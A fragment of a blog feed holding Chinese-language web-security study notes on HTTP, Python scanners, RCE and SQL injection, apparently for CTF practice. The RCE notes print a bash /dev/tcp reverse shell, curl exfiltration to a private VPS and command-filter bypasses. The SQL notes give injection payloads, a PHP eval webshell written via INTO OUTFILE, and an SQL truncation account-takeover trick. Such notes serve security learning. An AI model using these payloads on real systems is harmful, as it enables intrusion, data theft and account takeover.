id="HTTP-1-1与HTTPS"   >          <a href="#HTTP-1-1与HTTPS" class="heading-link"><i class="fas fa-link"></i></a><a href="#HTTP-1-1与HTTPS" class="headerlink" title="HTTP 1.1与HTTPS"></a>HTTP 1.1与HTTPS</h6>      <p>OPTIONS PUT DELETE TRACE CONNECT PATCH</p>        <h3 id="URL格式"   >          <a href="#URL格式" class="heading-link"><i class="fas fa-link"></i></a><a href="#URL格式" class="headerlink" title="URL格式"></a>URL格式</h3>      <p>协议://主机名.域名/文件夹/文件?参数=值&amp;参数=值</p>        <h3 id="HTTP请求头"   >          <a href="#HTTP请求头" class="heading-link"><i class="fas fa-link"></i></a><a href="#HTTP请求头" class="headerlink" title="HTTP请求头"></a>HTTP请求头</h3>      <p>User-Agent：浏览器版本信息</p><p>Accept-encoding：浏览器接受的编码</p><p>Referer：当前网页跳转来源</p><p>Cookie：顾名思义，<del>好吃的饼干，</del>Cookie信息</p><p>Location：跳转到哪里</p><p>Set-Cookie：设置Cookie信息</p><p>WWW-Authenticate：用于身份验证HTTP Basic等</p>        <h3 id="HTTP响应状态码"   >          <a href="#HTTP响应状态码" class="heading-link"><i class="fas fa-link"></i></a><a href="#HTTP响应状态码" class="headerlink" title="HTTP响应状态码"></a>HTTP响应状态码</h3>      <p>1XX：信息提示</p><p>2XX：成功</p><p>3XX：重定向</p><p>4XX：客户端错误</p><p>5XX：服务端错误</p>        <h3 id="查看HTTP"   >          <a href="#查看HTTP" class="heading-link"><i class="fas fa-link"></i></a><a href="#查看HTTP" class="headerlink" title="查看HTTP"></a>查看HTTP</h3>      <p>使用浏览器审查进行查看</p><p>使用Burpsuite截断查看</p>        <h2 id="Python使用HTTP请求"   >          <a href="#Python使用HTTP请求" class="heading-link"><i class="fas fa-link"></i></a><a href="#Python使用HTTP请求" class="headerlink" title="Python使用HTTP请求"></a>Python使用HTTP请求</h2>              <h6 id="GET请求"   >          <a href="#GET请求" class="heading-link"><i class="fas fa-link"></i></a><a href="#GET请求" class="headerlink" title="GET请求"></a>GET请求</h6>      <p>不带参数<code>requests.get(url)</code></p><p>带参数<code>requests.get(url=url,params=&#123;&quot;key1&quot;:&quot;value1&quot;,&quot;key2&quot;:&quot;value2&quot;&#125;)</code></p><p>返回的对象r.url获取url</p>        <h6 id="POST请求"   >          <a href="#POST请求" class="heading-link"><i class="fas fa-link"></i></a><a href="#POST请求" class="headerlink" title="POST请求"></a>POST请求</h6>      <p>不带参数<code>requests.post(url)</code></p><p>带参数<code>requests.post(url=url,data=&#123;&quot;key1&quot;:&quot;value1&quot;,&quot;key2&quot;:&quot;value2&quot;&#125;)</code></p>        <h6 id="自定义请求头"   >          <a href="#自定义请求头" class="heading-link"><i class="fas fa-link"></i></a><a href="#自定义请求头" class="headerlink" title="自定义请求头"></a>自定义请求头</h6>      <p>headers={key1:value1,key2:value2}</p><p>requests.get(url=url,headers=headers)</p>        <h6 id="其他请求"   >          <a href="#其他请求" class="heading-link"><i class="fas fa-link"></i></a><a href="#其他请求" class="headerlink" title="其他请求"></a>其他请求</h6>      <p>requests.put(url,data)</p><p>requests.delete(url)</p><p>requests.head(url)</p><p>requests.options(url)</p>        <h2 id="Python处理HTTP响应"   >          <a href="#Python处理HTTP响应" class="heading-link"><i class="fas fa-link"></i></a><a href="#Python处理HTTP响应" class="headerlink" title="Python处理HTTP响应"></a>Python处理HTTP响应</h2>      <p><strong>获取相应状态码：</strong>r.status_code</p><p><strong>获取响应文本：</strong>r.content（获取到二进制内容）r.text（获取原始文本代码）</p><p><strong>获取相应头：</strong>r.headers</p><p><strong>获取请求头：</strong>r.reuqests.headers</p><p><strong>获取请求URL：</strong>r.url</p><p><strong>获取Cookie：</strong>r.cookies</p>        <h2 id="Python设置HTTP代理"   >          <a href="#Python设置HTTP代理" class="heading-link"><i class="fas fa-link"></i></a><a href="#Python设置HTTP代理" class="headerlink" title="Python设置HTTP代理"></a>Python设置HTTP代理</h2>      <p><strong>代理设置：</strong>http和https:<code>proxies=&#123;&#39;http&#39;:&#39;http://代理服务器:代理端口&#39;,&#39;https&#39;:&#39;https://代理服务器:代理端口&#39;&#125;</code></p><p><strong>参数设置：</strong><code>proxies=proxies,verfiy=False</code></p>        <h2 id="Python会话编程"   >          <a href="#Python会话编程" class="heading-link"><i class="fas fa-link"></i></a><a href="#Python会话编程" class="headerlink" title="Python会话编程"></a>Python会话编程</h2>      <p>通过Set-Cookie设置一个cookie值</p><p>使用<code>s=requesets.Session()</code>建立一个新的空会话</p><p><code>r=s.get(url)</code>来在会话中发起个体请求</p>        <h2 id="Python制作目录扫描工具"   >          <a href="#Python制作目录扫描工具" class="heading-link"><i class="fas fa-link"></i></a><a href="#Python制作目录扫描工具" class="headerlink" title="Python制作目录扫描工具"></a>Python制作目录扫描工具</h2>              <h6 id="目录扫描原理"   >          <a href="#目录扫描原理" class="heading-link"><i class="fas fa-link"></i></a><a href="#目录扫描原理" class="headerlink" title="目录扫描原理"></a>目录扫描原理</h6>      <p>1、读取字典文件拼接URL</p><p>2、通过get请求访问URL</p><p>3、获取状态码判断目录是否存在</p>        <h6 id="字典文件读取"   >          <a href="#字典文件读取" class="heading-link"><i class="fas fa-link"></i></a><a href="#字典文件读取" class="headerlink" title="字典文件读取"></a>字典文件读取</h6>      <p>1、<code>with open(&quot;filename.txt&quot;,&quot;r&quot;) as f:</code></p><p>2、读取方式：</p><ul><li><code>f.readline()//读取一行</code></li><li><code>f.readlines()//逐行读取到一个列表中</code></li><li><code>f.read(字节数)//按字节读</code></li><li><code>line.strip()//去除空行</code></li></ul><p>3、<code>f.close()</code>关闭文件流</p><p>4、sys库中的sys.argv[0]为当前python文件绝对路径，sys.argv[1]为传入第一个参数</p><p>5、User-Agent通过抓包先获取真实的User-Agent，再通过headers字典传入get请求</p>        <h2 id="IIS-PUT漏洞"   >          <a href="#IIS-PUT漏洞" class="heading-link"><i class="fas fa-link"></i></a><a href="#IIS-PUT漏洞" class="headerlink" title="IIS PUT漏洞"></a>IIS PUT漏洞</h2>      <p>IIS中拓展工具WebDAV支持HTTP方法，也提供了一些其他功能强大的方法（Move），使得开启WebDAV可以直接上传任意文件</p><p><strong>探测方法：</strong>通过HTTP中options方法可以探测出服务器支持的HTTP方法</p><p><strong>探测过程：</strong></p><ul><li>确定目标主机</li><li>使用HTTP options方法探测</li><li>查看返回结果中是否存在MOVE PUT</li><li>查看响应头中的PUBLIC属性</li></ul>        <h2 id="探测服务器信息"   >          <a href="#探测服务器信息" class="heading-link"><i class="fas fa-link"></i></a><a href="#探测服务器信息" class="headerlink" title="探测服务器信息"></a>探测服务器信息</h2>      <p>相应头中的Server：服务器中间件属性</p><p>X-Powered-By：服务器脚本技术</p>        <h2 id="Python制作漏洞检测工具"   >          <a href="#Python制作漏洞检测工具" class="heading-link"><i class="fas fa-link"></i></a><a href="#Python制作漏洞检测工具" class="headerlink" title="Python制作漏洞检测工具"></a>Python制作漏洞检测工具</h2>      <p>首先了解漏洞产生原理，根据漏洞原理写出对应的POC代码来验证漏洞是否存在</p>        <h2 id="构建站点地图"   >          <a href="#构建站点地图" class="heading-link"><i class="fas fa-link"></i></a><a href="#构建站点地图" class="headerlink" title="构建站点地图"></a>构建站点地图</h2>      <p>测试Web App的首要任务就是获取站点完整的目录和文件</p>        <h6 id="技术种类：建议使用两种方式同时进行"   >          <a href="#技术种类：建议使用两种方式同时进行" class="heading-link"><i class="fas fa-link"></i></a><a href="#技术种类：建议使用两种方式同时进行" class="headerlink" title="技术种类：建议使用两种方式同时进行"></a>技术种类：建议使用两种方式同时进行</h6>      <p>1、通过基于字典的目录文件扫描</p><p>2、通过基于网络爬虫的技术（可通过requests库构建，但是很复杂，有scrapy库可用于构建爬虫）</p><p>3、通过Burpsuite构建网站地图</p><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python基础</title>
      <link href="/posts/14702.html"/>
      <url>/posts/14702.html</url>
      
        <content type="html"><![CDATA[        <h1 id="Python基础"   >          <a href="#Python基础" class="heading-link"><i class="fas fa-link"></i></a><a href="#Python基础" class="headerlink" title="Python基础"></a>Python基础</h1>              <h4 id="数据类型："   >          <a href="#数据类型：" class="heading-link"><i class="fas fa-link"></i></a><a href="#数据类型：" class="headerlink" title="数据类型："></a>数据类型：</h4>      <p>string（字符串）</p><p>num（数字）</p><p>bool（布尔）</p><p>list（列表）使用[    ]定义</p><p>tuple（元组）使用{     }定义（无序）</p><p>dictionary（字典）使用{     }定义，内容为：下标名:元素内容</p><span id="more"></span>        <h4 id="字符串相关函数："   >          <a href="#字符串相关函数：" class="heading-link"><i class="fas fa-link"></i></a><a href="#字符串相关函数：" class="headerlink" title="字符串相关函数："></a>字符串相关函数：</h4>              <h6 id="查找："   >          <a href="#查找：" class="heading-link"><i class="fas fa-link"></i></a><a href="#查找：" class="headerlink" title="查找："></a>查找：</h6>      <pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token builtin">str</span><span class="token punctuation">.</span>find<span class="token punctuation">(</span>str1<span class="token punctuation">,</span>start<span class="token punctuation">,</span>end<span class="token punctuation">)</span><span class="token operator">//</span>rfind从末尾开始查找<span class="token builtin">str</span><span class="token punctuation">.</span>index<span class="token punctuation">(</span>str1<span class="token punctuation">,</span>start<span class="token punctuation">,</span>end<span class="token punctuation">)</span><span class="token operator">//</span>rindex从末尾开始查找<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>在字符串中查找是否存在str1，存在返回第一次出现的位置，不存在find返回-1，index报错</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token builtin">str</span><span class="token punctuation">.</span>count<span class="token punctuation">(</span>str1<span class="token punctuation">,</span>start<span class="token punctuation">,</span>end<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>查找字符串中某字符串出现的次数</p>        <h6 id="替换："   >          <a href="#替换：" class="heading-link"><i class="fas fa-link"></i></a><a href="#替换：" class="headerlink" title="替换："></a>替换：</h6>      <pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token builtin">str</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span>old<span class="token punctuation">,</span>new<span class="token punctuation">,</span>count<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>将字符串中old内容替换为new，count为最大替换次数，返回新字符串，不改变原来字符串</p>        <h6 id="切割："   >          <a href="#切割：" class="heading-link"><i class="fas fa-link"></i></a><a href="#切割：" class="headerlink" title="切割："></a>切割：</h6>      <pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token builtin">str</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span>str1<span class="token punctuation">,</span>count<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>将字符串以str1为分隔切割，count为最大切割次数，返回一个列表，不改变原有字符串，默认按空白字符进行全切割</p>        <h6 id="加入："   >          <a href="#加入：" class="heading-link"><i class="fas fa-link"></i></a><a href="#加入：" class="headerlink" title="加入："></a>加入：</h6>      <pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token builtin">str</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>可迭代对象<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>将str插入到可迭代对象两个元素之间，返回一个字符串</p>        <h6 id="乱七八糟："   >          <a href="#乱七八糟：" class="heading-link"><i class="fas fa-link"></i></a><a href="#乱七八糟：" class="headerlink" title="乱七八糟："></a>乱七八糟：</h6>      <pre class="line-numbers language-python" data-language="python"><code class="language-python">capitalize<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">)</span><span class="token operator">//</span>将字符串中第一个字母大写title<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">)</span><span class="token operator">//</span>字符串中每个单词首字母大写<span class="token builtin">str</span><span class="token punctuation">.</span>startwith<span class="token punctuation">(</span>str1<span class="token punctuation">)</span><span class="token operator">//</span>检查字符串是否以str1开头<span class="token builtin">str</span><span class="token punctuation">.</span>endwith<span class="token punctuation">(</span>str1<span class="token punctuation">)</span><span class="token operator">//</span>检查字符串是否以str1结尾<span class="token builtin">str</span><span class="token punctuation">.</span>upper<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">//</span>字母全大写<span class="token builtin">str</span><span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">//</span>字母全小写<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>input输入</p><p>print输出</p><p>read读文件（按字节读），readline（按行读）</p><p>open(“文件名”，”打开方式（r只读，w写入，a追加，（b）代表以二进制打开，（+）代表读写）”，encoding=”编码方式”)打开文件（以二进制进行读写时不能指定encoding方式）</p><p>*args不定长参数，接收后生成元组</p><p>**kwargs不定长参数，接收后生成字典</p>        <h4 id="Python内存管理机制：引用计数"   >          <a href="#Python内存管理机制：引用计数" class="heading-link"><i class="fas fa-link"></i></a><a href="#Python内存管理机制：引用计数" class="headerlink" title="Python内存管理机制：引用计数"></a>Python内存管理机制：引用计数</h4>      <pre class="line-numbers language-python" data-language="python"><code class="language-python">a<span class="token operator">=</span><span class="token number">1</span> <span class="token comment">#a地址引用为1</span>b<span class="token operator">=</span>a <span class="token comment">#a地址引用为2</span><span class="token keyword">del</span> a <span class="token comment">#a地址引用为1</span><span class="token keyword">del</span> b <span class="token comment">#a地址引用为0，此时a引用地址被销毁</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RCE远程代码执行</title>
      <link href="/posts/47881.html"/>
      <url>/posts/47881.html</url>
      
        <content type="html"><![CDATA[        <h1 id="RCE远程代码执行"   >          <a href="#RCE远程代码执行" class="heading-link"><i class="fas fa-link"></i></a><a href="#RCE远程代码执行" class="headerlink" title="RCE远程代码执行"></a><strong>RCE远程代码执行</strong></h1>              <h4 id="一、RCE能做到什么："   >          <a href="#一、RCE能做到什么：" class="heading-link"><i class="fas fa-link"></i></a><a href="#一、RCE能做到什么：" class="headerlink" title="一、RCE能做到什么："></a><strong>一、RCE能做到什么：</strong></h4>      <p>1、执行系统命令 2、记录用户输入 3、控制键盘鼠标 4、任意上传下载 5、截屏</p><span id="more"></span>        <h4 id="二、RCE产生原因："   >          <a href="#二、RCE产生原因：" class="heading-link"><i class="fas fa-link"></i></a><a href="#二、RCE产生原因：" class="headerlink" title="二、RCE产生原因："></a><strong>二、RCE产生原因：</strong></h4>      <p>1、服务器上有木马 </p><p>2、脆弱服务未授权</p><p>3、通过数据库写木马 </p><p>4、文件上传/文件包含 </p><p>5、危险函数（eval，assert，system，shell_exec，exec，file_put_contents） </p><p>6、命令执行 </p><p>7、反序列化</p>        <h4 id="三、RCE远程代码执行关键点："   >          <a href="#三、RCE远程代码执行关键点：" class="heading-link"><i class="fas fa-link"></i></a><a href="#三、RCE远程代码执行关键点：" class="headerlink" title="三、RCE远程代码执行关键点："></a><strong>三、RCE远程代码执行关键点：</strong></h4>              <h5 id="1、RCE黑名单过滤："   >          <a href="#1、RCE黑名单过滤：" class="heading-link"><i class="fas fa-link"></i></a><a href="#1、RCE黑名单过滤：" class="headerlink" title="1、RCE黑名单过滤："></a><strong>1、RCE黑名单过滤：</strong></h5>      <p>linux执行命令特殊字符：（;分割命令）（&amp;&amp;在前一个命令执行成功的前提下执行后面命令）（||前一个命令执行失败的前提下执行后面命令）（|将前面命令执行的结果作为输入，输入到后面命令中执行）（``将命令执行结果作为命令再次执行）（$()和前一个一样）</p><p>过滤空格后可使用&lt;向命令传入参数，${IFS}为空格，%0a为分号转译</p><p><code>cat绕过可使用tac more less head tac tail nl od(二进制查看) vi vim sort uniq</code></p><p><code>绕过空格用%09 &lt;&gt; $&#123;IFS&#125; $IFS$9 &#123;cat,fl*&#125; %20</code></p><p><code>flag绕过可使用通配符f*</code></p>        <h5 id="2、RCE无回显："   >          <a href="#2、RCE无回显：" class="heading-link"><i class="fas fa-link"></i></a><a href="#2、RCE无回显：" class="headerlink" title="2、RCE无回显："></a><strong>2、RCE无回显：</strong></h5>      <p>（1）、反弹shell：攻击端监听一个端口如：2333 </p><p>​    攻击端使用：</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">nc</span> <span class="token parameter variable">-lvp</span> 监听的端口<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>​    受害端使用如下命令生成一个反弹shell：</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">bash</span> <span class="token parameter variable">-i</span> <span class="token operator">>&amp;</span> /dev/tcp/攻击端IP/攻击端监听端口 <span class="token operator"><span class="token file-descriptor important">0</span>></span><span class="token file-descriptor important">&amp;1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>​    在攻击端终端即可在受害端中执行命令</p><p>（2）、dnslog：通过ping $(命令).域名 通过这种方式获取命令执行结果</p><p>（3）、写文件：将命令执行结果写入到文件中，使用echo命令：</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token builtin class-name">echo</span> <span class="token string">"写入内容"</span><span class="token operator">></span>test.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>（4）、curl等网络命令：通过POST等方式直接给到个人私有VPS中</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">curl</span> <span class="token parameter variable">-d</span> <span class="token string">"key1=value1&amp;key2=value2&amp;key3=value3"</span> protocol://ip:port/path<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>        <h5 id="3、RCE后发现不出网"   >          <a href="#3、RCE后发现不出网" class="heading-link"><i class="fas fa-link"></i></a><a href="#3、RCE后发现不出网" class="headerlink" title="3、RCE后发现不出网"></a><strong>3、RCE后发现不出网</strong></h5>      <p>（1）、写文件</p><p>（2）、命令盲注：命令||sleep 100</p><p>（3）、隐蔽信道</p>        <h5 id="4、字符绕过"   >          <a href="#4、字符绕过" class="heading-link"><i class="fas fa-link"></i></a><a href="#4、字符绕过" class="headerlink" title="4、字符绕过"></a>4、字符绕过</h5>      <p>（1）、</p><pre class="line-numbers language-none"><code class="language-none">使用&#39;&#39;或&quot;&quot;隔断字符串<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>（2）、空格可使用：&lt;，&lt;&gt;，${IFS}，$IFS，%20(space)，%09(tab)，$IFS$9，$IFS$1 替换</p><p>（3）、分号可使用：%0a，%0d，%0D，%0A 替换</p><p>（4）、使用base64编码：Y2F0IGZsYWcucGhw|base64，将其中内容解码后执行</p><p>（5）、使用`反引号包裹命令，将其中内容作为前一命令的输入</p>        <h5 id="5、可用于执行系统命令的函数"   >          <a href="#5、可用于执行系统命令的函数" class="heading-link"><i class="fas fa-link"></i></a><a href="#5、可用于执行系统命令的函数" class="headerlink" title="5、可用于执行系统命令的函数"></a>5、可用于执行系统命令的函数</h5>      <p>exec()、passthru()、system()、shell_exec()</p><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      
        <tags>
            
            <tag> Note </tag>
            
            <tag> web </tag>
            
            <tag> RCE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL注入笔记</title>
      <link href="/posts/26213.html"/>
      <url>/posts/26213.html</url>
      
        <content type="html"><![CDATA[        <h1 id="SQL注入"   >          <a href="#SQL注入" class="heading-link"><i class="fas fa-link"></i></a><a href="#SQL注入" class="headerlink" title="SQL注入"></a><strong>SQL注入</strong></h1>      <p>1、通过order by爆出字段数</p><p>2、union操作，联合查询，查询的是在同一个数据表的数据，通过union select 1,2,3…,n来判断回显位置</p><p>3、information_schema数据库，为mysql自带数据库，提供数据库源数据访问，最常用的是</p><p><strong>TABLES表</strong>：提供了关于数据库中表的信息</p><p><strong>COLUMNS表</strong>：提供了表中列的信息</p><span id="more"></span><p>爆破库名：</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">union select 1,2,database()&#x2F;&#x2F;靠错误爆出库名and exists(select * from aaa)&#x2F;&#x2F;aaa表并不存在，此时会报错停止并返回数据库名.aaa<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>爆破表名：</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">union select 1,2,group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()and exists(select * from 表名)&#x2F;&#x2F;爆破出表名<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>爆破列名：</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">union select 1,2,group_concat(column_name) from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;&quot;想查询的表名&quot;and exists(select 列名 from 已知表名)&#x2F;&#x2F;爆破出列名<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>4、报错注入</p><p>（1）updatexml：更新XML文档的函数</p><p>语法：<strong>updatexml（文档类型，xpath路径，更新的内容）</strong></p><p>例子：</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">and updatexml(0x0a,concat(0x0a,(select database())),’1’)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>0x0a代表换行符，concat拼接</p><p>拼接目的为使得查询结果能完全显示出来</p><p>（2）extractvalue：对XML文档进行查询的函数</p><p>语法：<strong>extractvalue（文档类型，xpath路径）</strong></p><p>报错原理：路径中写入不合法的格式，就会报错并且返回我们写入的非法格式内容，我们可以利用这个得到我们想得到的内容</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">and (select extractvalue(1, concat(0x7e, (select group_concat(table_name) from information_schema.tables where table_schema&#x3D; &#39;sqli&#39;))))<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>提示：报错最长显示30个字符内容，如果内容过长可使用substr函数进行拆分</p><p>​    例题：CTFHub技能树web-SQL注入-报错注入</p><p>​    <img src="/images/quiz/SQLError.png" alt="SQLError"></p><p>​    首先爆破库表列名</p><p>​    <img src="/images/quiz/SQLError2.png" alt="SQLError2"></p><p>​    进而发现flag过长用substr切割</p><p>​    <img src="/images/quiz/SQLError3.png" alt="SQLError3"></p><p>​    得到flag</p><p>5、盲注：</p><p>布尔盲注：回显只有两种情况，一种有一种无</p><p>if表达式：if(expr1,expr2,expr3)</p><p>expr1为真就返回expr2（可用于执行函数）</p><p>substr函数：substr(字符串,起始位置,截取长度)</p><p>ascii函数：将函数内字符以ascii表转换为数字，而后可以进行判断</p><p>时间盲注：无回显，可以通过sleep函数判断是否为时间盲注</p><p><del>建议直接sqlmap</del></p><p>（1）、sleep函数看延迟时间</p><p>（2）、benchmark(执行次数,方式)，执行超多次看延迟时间</p><p>6、堆叠注入：通过语句分割符号（  ;  ）分隔多条语句，直接将想要的数据插入到表中，然后再通过查询语句读取</p><p>7、mysql文件读写：读取：load_file函数：load_file(‘文件路径’)</p><p>写入：</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">select ‘&lt;?php eval($_POST[cmd]);?&gt;’ into outfile或dumpfile &#39;绝对路径&#39;;&#x2F;&#x2F;建议用dumpfile，因为outfile会在文件末行写入新行，使用的转译换行符，会破坏文件完整性，可能导致一句话木马无法执行<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>8、关键词绕过：通过</p><p>（1）、set@a：设定一个语句变量 set@sql=0x16进制数</p><p>（2）、prepare : 存储一个sql语句 存到execsql 里面 prepare execsql from @sql</p><p>（3）、execute :执行一个sql语句 execute execsql</p><p>由于设定语句变量时，mysql会自动将16进制数据转换为文字</p><p>9、零碎</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">to_base64(内容)&#x2F;&#x2F;该语句将内容经过base64编码后输出replace(ori,old,new)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">%0a,&#x2F;**&#x2F;可代替空格<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">--+，%23，#将后面的语句注释<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>10、SQL约束攻击</p><p>在SQL中执行字符串处理时，字符串末尾的空格符将会被删除。例如如下代码：</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> userId <span class="token keyword">from</span> <span class="token keyword">user</span> <span class="token keyword">where</span> username <span class="token operator">=</span> <span class="token string">'test            '</span><span class="token comment">//看这里有很多空格</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>上述代码和username = ‘test’结果是一样的。但也存在异常情况，最好的例子就是LIKE子句了。注意，对尾部空白符的这种修剪操作，主要是在“<strong>字符串比较</strong>”期间进行的。这是因为，<strong>SQL会在内部使用空格来填充字符串</strong>，<strong>以便在比较之前使其它们的长度保持一致</strong>。</p><p>在所有的INSERT查询中，SQL都会根据varchar(n)来限制字符串的最大长度。也就是说，如果字符串的长度大于“n”个字符的话，那么仅插入字符串的前“n”个字符。比如特定列的长度约束为“5”个字符，那么在插入字符串“testName”时，实际上只能插入字符串的前5个字符，即“testN”。</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">//注册示例代码<span class="token prolog">&lt;?php$username = mysql_real_escape_string($_GET['username']);$password = mysql_real_escape_string($_GET['password']);$query = "SELECT *          FROM users          WHERE username='$username'";$res = mysql_query($query, $database);if($res) &#123;  if(mysql_num_rows($res) > 0) &#123;  &#125;  else &#123;    $query = "INSERT INTO users(username, password)?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里注册时使用用户名+【大量空格】和随机密码注册即可完成攻击。</p><p>主要原理就是insert时候有varchar(n)的限制，大于n的时候会截取前n个存入。在数据库对字符串进行比较时，即select操作，如果两个字符串的长度不一样，则会将较短的字符串末尾填充空格，使两个字符串的长度一致。注册时select语句不会将”admin+[大量空格]11”删减到n位，所以不会被select查出与admin重复，不会返回数据，接下来就可以插入admin+[空格]（截取）11和自定义密码了。</p><p>如果使用用户名“vampire”和密码“random_pass”登录的话，对比时是admin与admin+[大量空格]，会将前面的admin添加空格与后面的长度相同在进行对比，那么返回的只能是我们自己注册的用户信息，而不会返回目标用户信息。SQL查询语句是一个and操作，如果密码不一样怎么会把目标用户的信息也返回回来?</p><p>当登陆时使用admin与自定义密码登陆，数据库将返回我们自己注册的账户信息，但是注意此处的return $username，虽然此时查询出来的是我们自己的用户信息，但是返回的用户名则是目标的用户名。如果此后的业务逻辑直接以该用户名为准，则我们就达到了水平越权的目的。</p><p><strong>HANDLER语句查询</strong></p><p>出自该题[GYCTF2020]Blacklist，类似于某道堆叠注入的进阶版，但是该题过滤太多了，之前那道题的payload完全不可用了</p><pre class="line-numbers language-none"><code class="language-none">return preg_match(&quot;&#x2F;set|prepare|alter|rename|select|update|delete|drop|insert|where|\.&#x2F;i&quot;,$inject);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>知识点：handler语句查询</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">HANDLER tbl_name OPEN [ [AS] alias] HANDLER tbl_name READ index_name &#123; &#x3D; | &lt;&#x3D; | &gt;&#x3D; | &lt; | &gt; &#125; (value1,value2,...)    [ WHERE where_condition ] [LIMIT ... ]HANDLER tbl_name READ index_name &#123; FIRST | NEXT | PREV | LAST &#125;    [ WHERE where_condition ] [LIMIT ... ]HANDLER tbl_name READ &#123; FIRST | NEXT &#125;    [ WHERE where_condition ] [LIMIT ... ] HANDLER tbl_name CLOSE<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>构造出语句如下</p><pre class="line-numbers language-none"><code class="language-none">payload:1&#39;;use supersqli;handler FlagHere open;handler FlagHere read first;handler FlagHere close;#<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>distinct+列名可以去除重复值</p><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" 